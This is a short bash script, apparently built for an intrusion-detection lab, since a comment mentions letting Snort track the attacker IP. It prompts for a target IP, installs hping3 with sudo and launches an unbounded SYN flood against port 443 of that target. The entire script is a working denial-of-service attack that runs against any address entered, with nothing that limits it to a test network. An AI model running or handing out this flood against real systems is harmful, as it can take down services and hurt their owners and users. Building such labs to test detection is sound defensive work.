#!/bin/bash
echo "💣 Simulate DoS Attack (hping3)"

read -rp "Enter target IP (e.g. 192.168.0.19): " TARGET
TARGET=${TARGET:-192.168.0.19}

echo "📦 Installing hping3..."
sudo apt-get update && sudo apt-get install -y hping3

echo "🚀 Sending SYN flood to $TARGET:443 ..."
echo "⏳ Press Ctrl+C to stop the attack."

# Removed --rand-source to allow Snort to track packets by attacker IP
sudo hping3 "$TARGET" -q -n -d 120 -S -p 443 --flood
